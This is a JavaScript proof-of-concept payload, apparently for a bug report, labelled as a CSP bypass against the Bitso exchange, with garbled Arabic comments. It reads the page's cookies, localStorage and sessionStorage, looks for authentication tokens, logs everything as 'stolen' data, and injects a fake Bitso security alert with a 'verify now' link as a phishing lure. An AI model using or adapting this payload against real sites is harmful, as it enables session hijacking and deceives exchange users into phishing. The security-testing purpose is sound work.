(function() {
    // ุฑุณุงูุฉ ุชุฃููุฏ ูู ุงููููุณูู
    console.log("[โ Bitso CSP Bypass] Script executed on:", document.domain);

    // ุฌูุน ุงูุจูุงูุงุช ุงูุญุณุงุณุฉ
    const stolen = {
        url: window.location.href,
        cookies: document.cookie,
        localStorage: {},
        sessionStorage: {}
    };

    // ุงูุฑุฃ localStorage
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        stolen.localStorage[key] = localStorage.getItem(key);
    }

    // ุงูุฑุฃ sessionStorage (ุฃุญูุงููุง ูุญุชูู ุนูู ุฑููุฒ ูุคูุชุฉ)
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        stolen.sessionStorage[key] = sessionStorage.getItem(key);
    }

    // ุงุจุญุซ ุนู ุฑููุฒ ูุตุงุฏูุฉ ูุญุชููุฉ
    const possibleTokens = [
        'accessToken',
        'authToken',
        'token',
        'jwt',
        'session',
        'userToken',
        'id_token'
    ];

    let foundToken = null;
    for (const key of possibleTokens) {
        if (stolen.localStorage[key]) {
            foundToken = { source: 'localStorage', key, value: stolen.localStorage[key] };
            break;
        }
        if (stolen.sessionStorage[key]) {
            foundToken = { source: 'sessionStorage', key, value: stolen.sessionStorage[key] };
            break;
        }
    }

    // ุณุฌูู ุงููุชุงุฆุฌ
    console.log("[Bitso] Stolen data:", stolen);
    if (foundToken) {
        console.log("[๐จ CRITICAL] Auth token found!", foundToken);
        // โ๏ธ ูุง ุชูุฑุณูู ูุนูููุง โ ููุท ุณุฌููู ูู ุงููููุณูู ูุฃุบุฑุงุถ ุงูุฅุซุจุงุช
    } else {
        console.log("[โน๏ธ] No auth token found, but device/session IDs may still be valuable.");
    }

    // === ุฅุถุงูุฉ: ุญูู ุชุญุฐูุฑ ูุฒูู (ูุซู OKX) ===
    const fakeAlert = document.createElement('div');
    fakeAlert.innerHTML = `
        <div style="
            position: fixed;
            top: 20px;
            right: 20px;
            background: #fff8e1;
            border: 2px solid #ffc107;
            padding: 16px;
            border-radius: 8px;
            font-family: sans-serif;
            z-index: 999999;
            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
            max-width: 400px;
            font-size: 14px;
        ">
            <strong style="color: #ff9800;">โ๏ธ ุชูุจูู ุฃููู ูู Bitso</strong><br>
            ุชู ุงูุชุดุงู ูุดุงุท ุบูุฑ ุนุงุฏู ูู ุฌูุงุฒู. ูุฑุฌู <a href="#" style="color: #1976d2; text-decoration: underline;">ุงูุชุญูู ุงูุขู</a> ูุญูุงูุฉ ุฃููุงูู.
        </div>
    `;
    document.body.appendChild(fakeAlert);
})();
